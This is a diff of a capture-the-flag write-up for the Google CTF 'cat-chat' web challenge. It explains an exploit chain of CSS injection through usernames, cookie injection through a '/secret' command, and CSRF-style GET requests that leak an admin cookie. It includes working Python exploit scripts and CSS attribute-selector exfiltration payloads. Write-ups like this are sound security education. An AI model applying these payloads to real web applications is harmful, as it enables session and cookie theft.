@@ -2,7 +2,7 @@
 
 This challenge was straight forward, as it allows us to grab the code of both server and client. This simplifies exploitation a lot, as the final goal is quite clear. As the flag is in an admin cookie, we have to find a way to leak this. Our initial guess was some kind of XSS, but we quickly realised it was not the correct solution.
 
-The website have multiple small vulnerabilities, which together form an elegant exploit chain. The final exploit is built on the following vulnerabilities:
+The website has multiple small vulnerabilities, which together form an elegant exploit chain. The final exploit is built on the following vulnerabilities:
 
 1. CSS injection allows to leak data from the HTML DOM
 2. GET requests are accepted for server /send requests
@@ -112,7 +112,7 @@ The escape function only escapes the characters <, >, " and '. This means that w
 ... was banned.<style>span[data-name^=a]{} body {background: red} p[id=d] { color: red; }</style>
 ```
 
-We now have an injection in the form of CSS! Using the css property `background-image:url('https://random')` the browser will send a request to the given website. Combined with the CSS attribute selector, it is possible to leak information from the page. However, due to the content security policy (CSP), we are not allowed to access other domains (except google recaptcha):
+We now have an injection in the form of CSS! Using the css property `background-image:url(https://random)` the browser will send a request to the given website. Combined with the CSS attribute selector, it is possible to leak information from the page. However, due to the content security policy (CSP), we are not allowed to access other domains (except google recaptcha):
 
 ```
 content-security-policy: default-src 'self'; style-src 'unsafe-inline' 'self'; script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src 'self' https://www.google.com/recaptcha/
@@ -252,12 +252,14 @@ Thus, **to post a message from the admin client**, we would do the following:
 1. Write ```/report``` to get admin into the room
 2. Make a user with our CSS-payload as the username write a message containing the word 'dog'
 
-Sample:
+Sample which also turns the background green, showing control of the CSS:
 ```css
-> /name a]{background-image:url(https://cat-chat.web.ctfcompetition.com/room/2b081005-10bc-41b5-8965-317449da3d80/send?name=admin&msg=hello);}
+> /name a]{background-image:url(https://cat-chat.web.ctfcompetition.com/room/40fffe04-6915-4678-8562-f9ab7493f9ee/send?name=admin&msg=hello);} body{background:green}
 > I like dogs
 ```
-**TODO: Maybe include image**
+
+The result from the webbrowser i shown below. It is worth nothing that our admin wrote "hello". We see the message twice, as the CSS matches in two separate location of the source code:
+![proof](images/proof.png)
 
 We are now ready to proceed.
 
@@ -307,13 +309,13 @@ setInterval(() => {
     grecaptcha
         .execute(recaptcha_id, {action: 'report'})
         .then((token) => send('/report ' + token));
-}, 5000)
+}, 10000)
 ```
 
-Now an admin will join the room every 5th second. No need for manual hard work. 
+Now an admin will join the room every 10th second. No need for manual hard work. 
 
 ## Exploit chain
-Now we assemple the whole thing into our automated exploit. To sum up, we do the following:
+Now we assemple the whole thing into our exploit. To sum up, we do the following:
 
 1. Make the admin join the room using ```/report```
 2. Join the chat with a user with our payload as the username
@@ -322,10 +324,46 @@ Now we assemple the whole thing into our automated exploit. To sum up, we do the
 5. Ban the new CSS leaking user 
 6. Repeat the steps until we have the whole flag
 
-Final payload:
+Final payload for manually determining one character at a time:
 ```python
+import requests
+import urllib
+from time import sleep
+import random
 
+url = "https://cat-chat.web.ctfcompetition.com/room/d04b5419-ca84-4f13-ac65-925cbdd17f6f"
+
+def injectCSS(css):
+    send("a]{} " + css + " sdfsdf[sdsf=ff", "dog is da shit!")
+
+def send(name, message):
+    requests.get(url + "/send", params={"name": name, "msg": message}, headers={'referer': url})
+
+# Step 1: Join room manually and write /report
+
+# Step 2-3: Get him banned and dump password to HTML DOM in data-secret="XXX"
+send("/secret deadbeef; Domain=foo.web.ctfcompetition.com", "I fucking love dogs!")
+sleep(2)
+
+# Step 4-5: Leak admin cookie using CSS
+payload = "body {background: orange}"
+flag = "CTF\{L0LC4"
+for c in 'ABCDEFGHIJKLMNOPQRSTUVXYZW_-1234567890':
+    payload += " span[data-secret^=" + flag + c + "] { background: url(" + url + "/send?name=Guessed&msg=" + flag + c + ") }"
+
+injectCSS(payload)
 ```
+
+The images below show the result from the webbrowser:
+![leaking_secret](images/leaking_secret.png)
+
+Admin issued the command ```/ban /secret deadbeef; Domain=foo.web.ctfcompetition.com``` and thereby leaking his cookie to the DOM.
+
+Futher down the chat we see our CSS has been injected. Note that in the payload above, the payload has the ```body{background:orange}``` to show we control css. Furthermore we leak a single character, as we already knew the flag started with "CTF{L0LC4" (We have already run the exploit for the first characters).
+
+![leaking_flag](images/leaking_flag.png)
+
+Now it is just a matter of updating our exploit script with the new character and repeat the process.
 
 ## Further improvements to the exploit chain
 The following exploit automates the process of retrieving the secret from the chat. This allows it to repeat the CSS injection multiple times, in the same /report admin timespan. This makes it possible for the attacker to retrieve the secret with only two /report requests, and maybe a single one, on a network with lower latency.
@@ -336,7 +374,6 @@ The second tactic, is setting the CSS `p{color:#fff;}`, which turns all text whi
 
 The full almost automatic exploit:
 ```python
-
 #!/usr/bin/env python3
 import requests
 import uuid
@@ -388,8 +425,6 @@ while True:
     print("Please /report")
     searchReceive("I will ruthlessly ban anyone", roomUrl)
     while True:
-        print("Testing with {}".format(res))
-
 
         payload  = 'a],p{color:#fff;}'
         payload += ''.join([genCSSLine(res + c) for c in string.ascii_letters + string.digits + "_"])
@@ -412,3 +447,6 @@ while True:
             sys.exit()
         res = res.replace("{", "\\{")
 ```
+Running it gives us the flag without requiring constantly updating the exploit, as well as hiding the attack in the Exploited room:
+
+![leaking_flag](images/automatic_exploit.png)
